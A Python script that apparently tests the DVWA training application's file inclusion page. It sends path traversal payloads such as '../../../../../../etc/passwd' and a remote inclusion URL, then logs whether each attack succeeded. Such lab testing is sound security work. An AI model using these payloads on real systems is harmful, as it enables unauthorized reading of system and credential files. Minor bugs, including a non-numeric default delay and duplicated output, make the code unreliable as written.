import requests
from bs4 import BeautifulSoup
from datetime import datetime
from pathlib import Path
import os
import sys
import json
import time


# Setup directories and session
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL and/or request rate were not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 10, 'medium': 5, 'high': 3}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

fi_url = f"{base_url}/vulnerabilities/fi/?page="

def login_and_setup_security():
    # Assuming login is required; adjust as necessary
    pass

def file_inclusion_attack():
    file_paths = [
        "../hackable/flags/fi.php",  # Typically LFI
        "../../../../../../etc/passwd", # Typically LFI
        "https://www.google.com",  # RFI
    ]
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []

    for file_path in file_paths:
        full_url = fi_url + file_path
        response = session.get(full_url)
        total_tests += 1

        if "https" in file_path:
            test_type = "RFI"
            expected_content = "Google"
            successful = response.status_code == 200 and expected_content in response.text
        else:
            test_type = "LFI"
            expected_content1 = "Nice try ;-). Use the file include next time!"
            expected_content2 = "famous quotes"
            successful = (response.status_code == 200 and 
                          (expected_content1 in response.text or expected_content2 in response.text))
        
        if successful:
            tests_passed += 1
            result_status = f"PASSED - {test_type} Successful"
        else:
            tests_failed += 1
            result_status = f"FAILED - {test_type} Unsuccessful"
            
        print(f"Tested {test_type} with path '{file_path}'\nResult Status: {result_status}\nResponse Code: {response.status_code}\n")
        time.sleep(delay)

        details.append({
            "test_type": test_type,
            "path": file_path,
            "response_code": response.status_code,
            "status": result_status,
        })
        print(f"Tested {test_type} with path '{file_path}'\nResult Status: {result_status}\nResponse Code: {response.status_code}\n")

    # Log the results
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': fi_url,
        'details': details
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    login_and_setup_security()
    file_inclusion_attack()